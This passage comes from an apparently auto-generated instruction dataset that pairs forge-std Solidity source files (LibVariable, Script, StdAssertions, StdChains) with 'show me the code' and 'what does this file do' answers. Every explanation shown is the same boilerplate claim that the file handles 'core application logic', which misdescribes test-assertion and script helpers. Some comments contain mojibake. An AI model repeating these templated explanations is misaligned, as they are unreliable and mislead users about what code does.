memory)\n    {\n        return abi.decode(self.data, (bytes[]));\n    }\n}\n\n```"}
{"instruction": "What does the file LibVariable.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\n// Enable globally.\nusing LibVariable for Variable global;\n\nstruct Variable {\n    Type ty;\n    bytes data;\n}\n\nstruct Type {\n    TypeKind kind;\n    bool isArray;\n}\n\nenum TypeKind {\n    None,\n    Bool,\n    Address,\n    Bytes32,\n    Uint256,\n    Int256,\n    String,\n    Bytes\n}\n\n/// @notice Library for type-safe coercion of the `Variable` struct to concrete types.\n///\n/// @dev    Ensures that when a `Variable` is cast to a concrete Solidity type, the operation is safe and the\n///         underlying type matches what is expected.\n///         Provides functions to check types, convert them to strings, and coerce `Variable` instances into\n///         both single values and arrays of various types.\n///\n///         Usage example:\n///         ```solidity\n///         import {LibVariable} from \"./LibVariable.sol\";\n///\n///         contract MyContract {\n///             using LibVariable for Variable;\n///             StdConfig config;   // Assume 'config' is an instance of `StdConfig` and has already been loaded.\n///\n///             function readValues() public {\n///                 // Retrieve a 'uint256' value from the config.\n///                 uint256 myNumber = config.get(\"important_number\").toUint256();\n///\n///                 // Would revert with `TypeMismatch` as 'important_number' isn't a `uint256` in the config file.\n///                 // string memory notANumber = config.get(\"important_number\").toString();\n///\n///                 // Retrieve a address array from the config.\n///                 address[] memory admins = config.get(\"whitelisted_admins\").toAddressArray();\n///          }\n///      }\n///      ```\nlibrary LibVariable {\n    error NotInitialized();\n    error TypeMismatch(string expected, string actual);\n    error UnsafeCast(string message);\n\n    // -- TYPE HELPERS ----------------------------------------------------\n\n    /// @notice Compares two Type instances for equality.\n    function is\n```", "output": "This file `LibVariable.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Script.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\Script.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\n// ðŸ’¬ ABOUT\n// Forge Std's default Script.\n\n// ðŸ§© MODULES\nimport {console} from \"./console.sol\";\nimport {console2} from \"./console2.sol\";\nimport {safeconsole} from \"./safeconsole.sol\";\nimport {StdChains} from \"./StdChains.sol\";\nimport {StdCheatsSafe} from \"./StdCheats.sol\";\nimport {StdConstants} from \"./StdConstants.sol\";\nimport {stdJson} from \"./StdJson.sol\";\nimport {stdMath} from \"./StdMath.sol\";\nimport {StdStorage, stdStorageSafe} from \"./StdStorage.sol\";\nimport {StdStyle} from \"./StdStyle.sol\";\nimport {StdUtils} from \"./StdUtils.sol\";\nimport {VmSafe} from \"./Vm.sol\";\n\n// ðŸ“¦ BOILERPLATE\nimport {ScriptBase} from \"./Base.sol\";\n\n// â­ï¸ SCRIPT\nabstract contract Script is ScriptBase, StdChains, StdCheatsSafe, StdUtils {\n    // Note: IS_SCRIPT() must return true.\n    bool public IS_SCRIPT = true;\n}\n\n```"}
{"instruction": "What does the file Script.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\n// ðŸ’¬ ABOUT\n// Forge Std's default Script.\n\n// ðŸ§© MODULES\nimport {console} from \"./console.sol\";\nimport {console2} from \"./console2.sol\";\nimport {safeconsole} from \"./safeconsole.sol\";\nimport {StdChains} from \"./StdChains.sol\";\nimport {StdCheatsSafe} from \"./StdCheats.sol\";\nimport {StdConstants} from \"./StdConstants.sol\";\nimport {stdJson} from \"./StdJson.sol\";\nimport {stdMath} from \"./StdMath.sol\";\nimport {StdStorage, stdStorageSafe} from \"./StdStorage.sol\";\nimport {StdStyle} from \"./StdStyle.sol\";\nimport {StdUtils} from \"./StdUtils.sol\";\nimport {VmSafe} from \"./Vm.sol\";\n\n// ðŸ“¦ BOILERPLATE\nimport {ScriptBase} from \"./Base.sol\";\n\n// â­ï¸ SCRIPT\nabstract contract Script is ScriptBase, StdChains, StdCheatsSafe, StdUtils {\n    // Note: IS_SCRIPT() must return true.\n    bool public IS_SCRIPT = true;\n}\n\n```", "output": "This file `Script.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdAssertions.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdAssertions.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Vm} from \"./Vm.sol\";\n\nabstract contract StdAssertions {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    event log(string);\n    event logs(bytes);\n\n    event log_address(address);\n    event log_bytes32(bytes32);\n    event log_int(int256);\n    event log_uint(uint256);\n    event log_bytes(bytes);\n    event log_string(string);\n\n    event log_named_address(string key, address val);\n    event log_named_bytes32(string key, bytes32 val);\n    event log_named_decimal_int(string key, int256 val, uint256 decimals);\n    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);\n    event log_named_int(string key, int256 val);\n    event log_named_uint(string key, uint256 val);\n    event log_named_bytes(string key, bytes val);\n    event log_named_string(string key, string val);\n\n    event log_array(uint256[] val);\n    event log_array(int256[] val);\n    event log_array(address[] val);\n    event log_named_array(string key, uint256[] val);\n    event log_named_array(string key, int256[] val);\n    event log_named_array(string key, address[] val);\n\n    bytes32 private constant FAILED_SLOT = bytes32(\"failed\");\n\n    bool private _failed;\n\n    function failed() public view returns (bool) {\n        if (_failed) {\n            return true;\n        } else {\n            return vm.load(address(vm), FAILED_SLOT) != bytes32(0);\n        }\n    }\n\n    function fail() internal virtual {\n        vm.store(address(vm), FAILED_SLOT, bytes32(uint256(1)));\n        _failed = true;\n    }\n\n    function fail(string memory message) internal virtual {\n        fail();\n        vm.assertTrue(false, message);\n    }\n\n    function assertTrue(bool data) internal pure virtual {\n        if (!data) {\n            vm.assertTrue(data);\n        }\n    }\n\n    function assertTrue(bool data, string memory err) internal pure virtual {\n        if (!data) {\n            vm.assertTrue(data, err);\n        }\n    }\n\n    function assertFalse(bool data) internal pure virtual {\n        if (data) {\n            vm.assertFalse(data);\n        }\n    }\n\n    function assertFalse(bool data, string memory err) internal pure virtual {\n        if (data) {\n            vm.assertFalse(data, err);\n        }\n    }\n\n    function assertEq(bool left, bool right) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right);\n        }\n    }\n\n    function assertEq(bool left, bool right, string memory err) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right, err);\n        }\n    }\n\n    function assertEq(uint256 left, uint256 right) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right);\n        }\n    }\n\n    function assertEq(uint256 left, uint256 right, string memory err) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right, err);\n        }\n    }\n\n    function assertEqDecimal(uint256 left, uint256 right, uint256 decimals) internal pure virtual {\n        vm.assertEqDecimal(left, right, decimals);\n    }\n\n    function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertEqDecimal(left, right, decimals, err);\n    }\n\n    function assertEq(int256 left, int256 right) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right);\n        }\n    }\n\n    function assertEq(int256 left, int256 right, string memory err) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right, err);\n        }\n    }\n\n    function assertEqDecimal(int256 left, int256 right, uint256 decimals) internal pure virtual {\n        vm.assertEqDecimal(left, right, decimals);\n    }\n\n    function assertEqDecimal(int256 left, int256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertEqDecimal(left, right, decimals, err);\n    }\n\n    function assertEq(address left, address right) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right);\n        }\n    }\n\n    function assertEq(address left, address right, string memory err) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right, err);\n        }\n    }\n\n    function assertEq(bytes32 left, bytes32 right) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right);\n        }\n    }\n\n    function assertEq(bytes32 left, bytes32 right, string memory err) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right, err);\n        }\n    }\n\n    function assertEq32(bytes32 left, bytes32 right) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right);\n        }\n    }\n\n    function assertEq32(bytes32 left, bytes32 right, string memory err) internal pure virtual {\n        if (left != right) {\n            vm.assertEq(left, right, err);\n        }\n    }\n\n    function assertEq(string memory left, string memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(string memory left, string memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(bytes memory left, bytes memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(bytes memory left, bytes memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(bool[] memory left, bool[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(bool[] memory left, bool[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(uint256[] memory left, uint256[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(uint256[] memory left, uint256[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(int256[] memory left, int256[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(int256[] memory left, int256[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(address[] memory left, address[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(address[] memory left, address[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(bytes32[] memory left, bytes32[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(bytes32[] memory left, bytes32[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(string[] memory left, string[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(string[] memory left, string[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    function assertEq(bytes[] memory left, bytes[] memory right) internal pure virtual {\n        vm.assertEq(left, right);\n    }\n\n    function assertEq(bytes[] memory left, bytes[] memory right, string memory err) internal pure virtual {\n        vm.assertEq(left, right, err);\n    }\n\n    // Legacy helper\n    function assertEqUint(uint256 left, uint256 right) internal pure virtual {\n        assertEq(left, right);\n    }\n\n    function assertNotEq(bool left, bool right) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right);\n        }\n    }\n\n    function assertNotEq(bool left, bool right, string memory err) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right, err);\n        }\n    }\n\n    function assertNotEq(uint256 left, uint256 right) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right);\n        }\n    }\n\n    function assertNotEq(uint256 left, uint256 right, string memory err) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right, err);\n        }\n    }\n\n    function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals) internal pure virtual {\n        vm.assertNotEqDecimal(left, right, decimals);\n    }\n\n    function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string memory err)\n        internal\n        pure\n        virtual\n    {\n        vm.assertNotEqDecimal(left, right, decimals, err);\n    }\n\n    function assertNotEq(int256 left, int256 right) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right);\n        }\n    }\n\n    function assertNotEq(int256 left, int256 right, string memory err) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right, err);\n        }\n    }\n\n    function assertNotEqDecimal(int256 left, int256 right, uint256 decimals) internal pure virtual {\n        vm.assertNotEqDecimal(left, right, decimals);\n    }\n\n    function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertNotEqDecimal(left, right, decimals, err);\n    }\n\n    function assertNotEq(address left, address right) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right);\n        }\n    }\n\n    function assertNotEq(address left, address right, string memory err) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right, err);\n        }\n    }\n\n    function assertNotEq(bytes32 left, bytes32 right) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right);\n        }\n    }\n\n    function assertNotEq(bytes32 left, bytes32 right, string memory err) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right, err);\n        }\n    }\n\n    function assertNotEq32(bytes32 left, bytes32 right) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right);\n        }\n    }\n\n    function assertNotEq32(bytes32 left, bytes32 right, string memory err) internal pure virtual {\n        if (left == right) {\n            vm.assertNotEq(left, right, err);\n        }\n    }\n\n    function assertNotEq(string memory left, string memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(string memory left, string memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(bytes memory left, bytes memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(bytes memory left, bytes memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(bool[] memory left, bool[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(bool[] memory left, bool[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(uint256[] memory left, uint256[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(uint256[] memory left, uint256[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(int256[] memory left, int256[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(int256[] memory left, int256[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(address[] memory left, address[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(address[] memory left, address[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(bytes32[] memory left, bytes32[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(bytes32[] memory left, bytes32[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(string[] memory left, string[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(string[] memory left, string[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertNotEq(bytes[] memory left, bytes[] memory right) internal pure virtual {\n        vm.assertNotEq(left, right);\n    }\n\n    function assertNotEq(bytes[] memory left, bytes[] memory right, string memory err) internal pure virtual {\n        vm.assertNotEq(left, right, err);\n    }\n\n    function assertLt(uint256 left, uint256 right) internal pure virtual {\n        if (left >= right) {\n            vm.assertLt(left, right);\n        }\n    }\n\n    function assertLt(uint256 left, uint256 right, string memory err) internal pure virtual {\n        if (left >= right) {\n            vm.assertLt(left, right, err);\n        }\n    }\n\n    function assertLtDecimal(uint256 left, uint256 right, uint256 decimals) internal pure virtual {\n        vm.assertLtDecimal(left, right, decimals);\n    }\n\n    function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertLtDecimal(left, right, decimals, err);\n    }\n\n    function assertLt(int256 left, int256 right) internal pure virtual {\n        if (left >= right) {\n            vm.assertLt(left, right);\n        }\n    }\n\n    function assertLt(int256 left, int256 right, string memory err) internal pure virtual {\n        if (left >= right) {\n            vm.assertLt(left, right, err);\n        }\n    }\n\n    function assertLtDecimal(int256 left, int256 right, uint256 decimals) internal pure virtual {\n        vm.assertLtDecimal(left, right, decimals);\n    }\n\n    function assertLtDecimal(int256 left, int256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertLtDecimal(left, right, decimals, err);\n    }\n\n    function assertGt(uint256 left, uint256 right) internal pure virtual {\n        if (left <= right) {\n            vm.assertGt(left, right);\n        }\n    }\n\n    function assertGt(uint256 left, uint256 right, string memory err) internal pure virtual {\n        if (left <= right) {\n            vm.assertGt(left, right, err);\n        }\n    }\n\n    function assertGtDecimal(uint256 left, uint256 right, uint256 decimals) internal pure virtual {\n        vm.assertGtDecimal(left, right, decimals);\n    }\n\n    function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertGtDecimal(left, right, decimals, err);\n    }\n\n    function assertGt(int256 left, int256 right) internal pure virtual {\n        if (left <= right) {\n            vm.assertGt(left, right);\n        }\n    }\n\n    function assertGt(int256 left, int256 right, string memory err) internal pure virtual {\n        if (left <= right) {\n            vm.assertGt(left, right, err);\n        }\n    }\n\n    function assertGtDecimal(int256 left, int256 right, uint256 decimals) internal pure virtual {\n        vm.assertGtDecimal(left, right, decimals);\n    }\n\n    function assertGtDecimal(int256 left, int256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertGtDecimal(left, right, decimals, err);\n    }\n\n    function assertLe(uint256 left, uint256 right) internal pure virtual {\n        if (left > right) {\n            vm.assertLe(left, right);\n        }\n    }\n\n    function assertLe(uint256 left, uint256 right, string memory err) internal pure virtual {\n        if (left > right) {\n            vm.assertLe(left, right, err);\n        }\n    }\n\n    function assertLeDecimal(uint256 left, uint256 right, uint256 decimals) internal pure virtual {\n        vm.assertLeDecimal(left, right, decimals);\n    }\n\n    function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertLeDecimal(left, right, decimals, err);\n    }\n\n    function assertLe(int256 left, int256 right) internal pure virtual {\n        if (left > right) {\n            vm.assertLe(left, right);\n        }\n    }\n\n    function assertLe(int256 left, int256 right, string memory err) internal pure virtual {\n        if (left > right) {\n            vm.assertLe(left, right, err);\n        }\n    }\n\n    function assertLeDecimal(int256 left, int256 right, uint256 decimals) internal pure virtual {\n        vm.assertLeDecimal(left, right, decimals);\n    }\n\n    function assertLeDecimal(int256 left, int256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertLeDecimal(left, right, decimals, err);\n    }\n\n    function assertGe(uint256 left, uint256 right) internal pure virtual {\n        if (left < right) {\n            vm.assertGe(left, right);\n        }\n    }\n\n    function assertGe(uint256 left, uint256 right, string memory err) internal pure virtual {\n        if (left < right) {\n            vm.assertGe(left, right, err);\n        }\n    }\n\n    function assertGeDecimal(uint256 left, uint256 right, uint256 decimals) internal pure virtual {\n        vm.assertGeDecimal(left, right, decimals);\n    }\n\n    function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertGeDecimal(left, right, decimals, err);\n    }\n\n    function assertGe(int256 left, int256 right) internal pure virtual {\n        if (left < right) {\n            vm.assertGe(left, right);\n        }\n    }\n\n    function assertGe(int256 left, int256 right, string memory err) internal pure virtual {\n        if (left < right) {\n            vm.assertGe(left, right, err);\n        }\n    }\n\n    function assertGeDecimal(int256 left, int256 right, uint256 decimals) internal pure virtual {\n        vm.assertGeDecimal(left, right, decimals);\n    }\n\n    function assertGeDecimal(int256 left, int256 right, uint256 decimals, string memory err) internal pure virtual {\n        vm.assertGeDecimal(left, right, decimals, err);\n    }\n\n    function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta) internal pure virtual {\n        vm.assertApproxEqAbs(left, right, maxDelta);\n    }\n\n    function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string memory err) internal pure virtual {\n        vm.assertApproxEqAbs(left, right, maxDelta, err);\n    }\n\n    function assertApproxEqAbsDecimal(uint256 left, uint256 right, uint256 maxDelta, uint256 decimals)\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqAbsDecimal(left, right, maxDelta, decimals);\n    }\n\n    function assertApproxEqAbsDecimal(\n        uint256 left,\n        uint256 right,\n        uint256 maxDelta,\n        uint256 decimals,\n        string memory err\n    ) internal pure virtual {\n        vm.assertApproxEqAbsDecimal(left, right, maxDelta, decimals, err);\n    }\n\n    function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta) internal pure virtual {\n        vm.assertApproxEqAbs(left, right, maxDelta);\n    }\n\n    function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string memory err) internal pure virtual {\n        vm.assertApproxEqAbs(left, right, maxDelta, err);\n    }\n\n    function assertApproxEqAbsDecimal(int256 left, int256 right, uint256 maxDelta, uint256 decimals)\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqAbsDecimal(left, right, maxDelta, decimals);\n    }\n\n    function assertApproxEqAbsDecimal(int256 left, int256 right, uint256 maxDelta, uint256 decimals, string memory err)\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqAbsDecimal(left, right, maxDelta, decimals, err);\n    }\n\n    function assertApproxEqRel(\n        uint256 left,\n        uint256 right,\n        uint256 maxPercentDelta // An 18 decimal fixed point number, where 1e18 == 100%\n    )\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqRel(left, right, maxPercentDelta);\n    }\n\n    function assertApproxEqRel(\n        uint256 left,\n        uint256 right,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        string memory err\n    )\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqRel(left, right, maxPercentDelta, err);\n    }\n\n    function assertApproxEqRelDecimal(\n        uint256 left,\n        uint256 right,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        uint256 decimals\n    )\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqRelDecimal(left, right, maxPercentDelta, decimals);\n    }\n\n    function assertApproxEqRelDecimal(\n        uint256 left,\n        uint256 right,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        uint256 decimals,\n        string memory err\n    ) internal pure virtual {\n        vm.assertApproxEqRelDecimal(left, right, maxPercentDelta, decimals, err);\n    }\n\n    function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta) internal pure virtual {\n        vm.assertApproxEqRel(left, right, maxPercentDelta);\n    }\n\n    function assertApproxEqRel(\n        int256 left,\n        int256 right,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        string memory err\n    )\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqRel(left, right, maxPercentDelta, err);\n    }\n\n    function assertApproxEqRelDecimal(\n        int256 left,\n        int256 right,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        uint256 decimals\n    )\n        internal\n        pure\n        virtual\n    {\n        vm.assertApproxEqRelDecimal(left, right, maxPercentDelta, decimals);\n    }\n\n    function assertApproxEqRelDecimal(\n        int256 left,\n        int256 right,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        uint256 decimals,\n        string memory err\n    ) internal pure virtual {\n        vm.assertApproxEqRelDecimal(left, right, maxPercentDelta, decimals, err);\n    }\n\n    // Inherited from DSTest, not used but kept for backwards-compatibility\n    function checkEq0(bytes memory left, bytes memory right) internal pure returns (bool) {\n        return keccak256(left) == keccak256(right);\n    }\n\n    function assertEq0(bytes memory left, bytes memory right) internal pure virtual {\n        assertEq(left, right);\n    }\n\n    function assertEq0(bytes memory left, bytes memory right, string memory err) internal pure virtual {\n        assertEq(left, right, err);\n    }\n\n    function assertNotEq0(bytes memory left, bytes memory right) internal pure virtual {\n        assertNotEq(left, right);\n    }\n\n    function assertNotEq0(bytes memory left, bytes memory right, string memory err) internal pure virtual {\n        assertNotEq(left, right, err);\n    }\n\n    function assertEqCall(address target, bytes memory callDataA, bytes memory callDataB) internal virtual {\n        assertEqCall(target, callDataA, target, callDataB, true);\n    }\n\n    function assertEqCall(address targetA, bytes memory callDataA, address targetB, bytes memory callDataB)\n        internal\n        virtual\n    {\n        assertEqCall(targetA, callDataA, targetB, callDataB, true);\n    }\n\n    function assertEqCall(address target, bytes memory callDataA, bytes memory callDataB, bool strictRevertData)\n        internal\n        virtual\n    {\n        assertEqCall(target, callDataA, target, callDataB, strictRevertData);\n    }\n\n    function assertEqCall(\n        address targetA,\n        bytes memory callDataA,\n        address targetB,\n        bytes memory callDataB,\n        bool strictRevertData\n    ) internal virtual {\n        (bool successA, bytes memory returnDataA) = address(targetA).call(callDataA);\n        (bool successB, bytes memory returnDataB) = address(targetB).call(callDataB);\n\n        if (successA && successB) {\n            assertEq(returnDataA, returnDataB, \"Call return data does not match\");\n        }\n\n        if (!successA && !successB && strictRevertData) {\n            assertEq(returnDataA, returnDataB, \"Call revert data does not match\");\n        }\n\n        if (!successA && successB) {\n            emit log(\"Error: Calls were not equal\");\n            emit log_named_bytes(\"  Left call revert data\", returnDataA);\n            emit log_named_bytes(\" Right call return data\", returnDataB);\n            revert(\"assertion failed\");\n        }\n\n        if (successA && !successB) {\n            emit log(\"Error: Calls were not equal\");\n            emit log_named_bytes(\"  Left call return data\", returnDataA);\n            emit log_named_bytes(\" Right call revert data\", returnDataB);\n            revert(\"assertion failed\");\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file StdAssertions.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Vm} from \"./Vm.sol\";\n\nabstract contract StdAssertions {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    event log(string);\n    event logs(bytes);\n\n    event log_address(address);\n    event log_bytes32(bytes32);\n    event log_int(int256);\n    event log_uint(uint256);\n    event log_bytes(bytes);\n    event log_string(string);\n\n    event log_named_address(string key, address val);\n    event log_named_bytes32(string key, bytes32 val);\n    event log_named_decimal_int(string key, int256 val, uint256 decimals);\n    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);\n    event log_named_int(string key, int256 val);\n    event log_named_uint(string key, uint256 val);\n    event log_named_bytes(string key, bytes val);\n    event log_named_string(string key, string val);\n\n    event log_array(uint256[] val);\n    event log_array(int256[] val);\n    event log_array(address[] val);\n    event log_named_array(string key, uint256[] val);\n    event log_named_array(string key, int256[] val);\n    event log_named_array(string key, address[] val);\n\n    bytes32 private constant FAILED_SLOT = bytes32(\"failed\");\n\n    bool private _failed;\n\n    function failed() public view returns (bool) {\n        if (_failed) {\n            return true;\n        } else {\n            return vm.load(address(vm), FAILED_SLOT) != bytes32(0);\n        }\n    }\n\n    function fail() internal virtual {\n        vm.store(address(vm), FAILED_SLOT, bytes32(uint256(1)));\n        _failed = true;\n    }\n\n    function fail(string memory message) internal virtual {\n        fail();\n        vm.assertTrue(false, message);\n    }\n\n    function assertTrue(bool data) internal pure virtual {\n        if (!data) {\n            vm.assertTrue(data);\n        }\n    }\n\n    function assertTrue(bool data, string memory err) internal pure virtual {\n        if (!data) {\n            vm.assertTrue(data\n```", "output": "This file `StdAssertions.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdChains.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdChains.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\n/**\n * StdChains provides information about EVM compatible chains that can be used in scripts/tests.\n * For each chain, the chain's name, chain ID, and a default RPC URL are provided. Chains are\n * identified by their alias, which is the same as the alias in the `[rpc_endpoints]` section of\n * the `foundry.toml` file. For best UX, ensure the alias in the `foundry.toml` file match the\n * alias used in this contract, which can be found as the first argument to the\n * `setChainWithDefaultRpcUrl` call in the `initializeStdChains` function.\n *\n * There are two main ways to use this contract:\n *   1. Set a chain with `setChain(string memory chainAlias, ChainData memory chain)` or\n *      `setChain(string memory chainAlias, Chain memory chain)`\n *   2. Get a chain with `getChain(string memory chainAlias)` or `getChain(uint256 chainId)`.\n *\n * The first time either of those are used, chains are initialized with the default set of RPC URLs.\n * This is done in `initializeStdChains`, which uses `setChainWithDefaultRpcUrl`. Defaults are recorded in\n * `defaultRpcUrls`.\n *\n * The `setChain` function is straightforward, and it simply saves off the given chain data.\n *\n * The `getChain` methods use `getChainWithUpdatedRpcUrl` to return a chain. For example, let's say\n * we want to retrieve the RPC URL for `mainnet`:\n *   - If you have specified data with `setChain`, it will return that.\n *   - If you have configured a mainnet RPC URL in `foundry.toml`, it will return the URL, provided it\n *     is valid (e.g. a URL is specified, or an environment variable is given and exists).\n *   - If neither of the above conditions is met, the default data is returned.\n *\n * Summarizing the above, the prioritization hierarchy is `setChain` -> `foundry.toml` -> environment variable -> defaults.\n */\nabstract contract StdChains {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    bool private stdChainsInitialized;\n\n    struct ChainData {\n        string name;\n        uint256 chainId;\n        string rpcUrl;\n    }\n\n    struct Chain {\n        // The chain name.\n        string name;\n        // The chain's Chain ID.\n        uint256 chainId;\n        // The chain's alias. (i.e. what gets specified in `foundry.toml`).\n        string chainAlias;\n        // A default RPC endpoint for this chain.\n        // NOTE: This default RPC URL is included for convenience to facilitate quick tests and\n        // experimentation. Do not use this RPC URL for production test suites, CI, or other heavy\n        // usage as you will be throttled and this is a disservice to others who need this endpoint.\n        string rpcUrl;\n    }\n\n    // Maps from the chain's alias (matching the alias in the `foundry.toml` file) to chain data.\n    mapping(string => Chain) 